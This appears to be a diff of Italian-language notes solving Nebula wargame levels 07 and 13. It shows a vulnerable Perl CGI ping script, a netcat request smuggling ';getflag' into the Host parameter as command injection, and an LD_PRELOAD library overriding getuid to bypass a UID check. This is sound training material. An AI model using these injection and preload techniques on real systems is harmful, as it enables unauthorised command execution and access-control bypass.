@@ -1,3 +1,86 @@
+## Nebula - Level07
+- Controlliamo il codice sorgente sul sito
+
+```perl
+#!/usr/bin/perl
+
+use CGI qw{param};
+
+print "Content-type: text/html\n\n";
+
+sub ping {
+  $host = $_[0];
+
+  print("<html><head><title>Ping results</title></head><body><pre>");
+
+  @output = `ping -c 3 $host 2>&1`;
+  foreach $line (@output) { print "$line"; }
+
+  print("</pre></body></html>");
+  
+}
+
+# check if Host set. if not, display normal page, etc
+
+ping(param("Host"));
+```
+- "$host = $_[0]; "  --> questa riga andiamo ad inserire il parametro presente in una query string all'interno della variabile host (dovrebbe essere un ip)
+- Successivamente stampo una pagina html che contiene il risultato del comando "**ping**"
+ - Attenzione al **foreach** (stampo tutte le righe)
+
+ > **Considerazione**: non c'è nessuna sanitizzazione dell'input, quindi è immediato come sia applicabile il nostro pattern malevolo INPUT = input legit + separatore + input malevolo + chiusura
+
+- L'applicazione è uno script CGI perl, dobbiamo interagire con un web server la cui configurazione si trova nel file thttpd.conf
+	- da questo file scopriamo la porta su cui è in ascolto il web server
+-  echo -ne "GET /index.cgi?Host=8.8.8.8%3Bgetflag\n\r\n\r" | nc localhost 7007
+## Nebula - Level13
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <string.h>
+
+#define FAKEUID 1000
+
+int main(int argc, char **argv, char **envp)
+{
+  int c;
+  char token[256];
+
+  if(getuid() != FAKEUID) {
+      printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
+      printf("The system administrators will be notified of this violation\n");
+      exit(EXIT_FAILURE);
+  }
+
+  // snip, sorry :)
+
+  printf("your token is %s\n", token);
+  
+}
+```
+
+ - il valore di getuid viene utilizzato direttamente come controllo d'accesso al token
+ - Ho una stampa molto verbosa
+ - Per trovare la soluzione in questo caso si va a leggere il manuale riguardante le variabili d'ambiente 
+	 - man 7 environ
+- Quello che scopro è che nella variabile d'ambiente LD_PRELOAD posso andare ad aggiungere una libreria condivisa che vada ad overridare getuid
+	- **Problema:** visto che il binario che la usa è SETUID allora per far si che l'overloading funzioni allora anche la libreria deve esserlo (NON SONO ROOT, NON POSSO ABILITARE IL SETUID). L'unica soluzione è fare l'inverso, togliere il setuid dal binario così che vada a caricare la mia libreria dinamica
+```c
+#include <unistd.h>
+#include <sys/types.h>
+
+uid_t getuid(void){
+	return 1000;
+}
+```
+
+- compilo il sorgente con gcc -shared -fPIC -o getuid.so getuid.c
+- 
+
+
 - Qui ci sarebbero altri esercizi prima che non ho inserito per motivi di voglia e semplicità come quelli sulle sql inj
 ## Protostar - Stack05
 ```c
